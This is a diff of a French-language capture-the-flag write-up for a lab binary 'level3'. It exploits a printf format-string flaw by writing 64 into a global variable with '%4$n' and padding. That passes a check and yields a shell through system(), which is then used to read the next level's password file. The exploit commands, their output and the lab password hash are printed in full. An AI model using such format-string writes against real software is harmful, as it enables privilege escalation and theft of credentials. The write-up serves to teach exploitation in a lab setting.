@@ -70,7 +70,7 @@ Dump of assembler code for function v:
 
 On remarque que le main du binaire appel une fonction `v()` (+6) et que cette derniere appelle plusieurs fonctions dont une fonction `printf()` (+49) vulnerable a exploit par format de chaine de caracteres.
 
-On voit aussi une comparaison `cmp` (+59) d'une variable globale `0x8049880` (+64), puis si la comparaison passe l'execution de `fwrite()`, mais surtout de `system()`. Afin de passer la condition, il faut determiner la valeur de cette variable.
+On voit aussi la comparaison `cmp` (+59) de `64` d'une variable globale `0x804988c` (+54), puis si la comparaison passe l'execution de `fwrite()`, mais surtout de `system()`. Afin de passer la condition, il faut determiner la valeur de cette variable.
 
 ```
 (gdb) info variables
@@ -98,11 +98,25 @@ aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825
 �200 b7fd1ac0 b7ff37d0 804988c
 ```
 
-Pour finir, on peux utiliser a present un `%n` qui cette fois pourra nous indiquer la valeur de notre variable.
+On a reperer notre buffer en 4e position. A present, on peux utiliser a present un `%n` pour ecrire a l'adresse de notre variable pour en changer sa valeur. L'adresse de `m` est de **4 bytes**, on doit donc ajouter **60 bytes** pour arriver au **64**
 
 ```
-:~$ python -c "print '\x8c\x98\x04\x08' + '%x %x %x %n'" | ./level3
-�200 b7fd1ac0 b7ff37d0
-
-:~$ python -c "print '\x8c\x98\x04\x08'+'%4$n'" | ./level3
+:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
 ```
+
+C'est une reussite, on atteint le fwrite qui semble nous afficher `Wait what?!` et donc on peux a present utiliser la fonction `system()`
+
+```
+:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/level3
+
+:~$ cat /tmp/level3 - | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
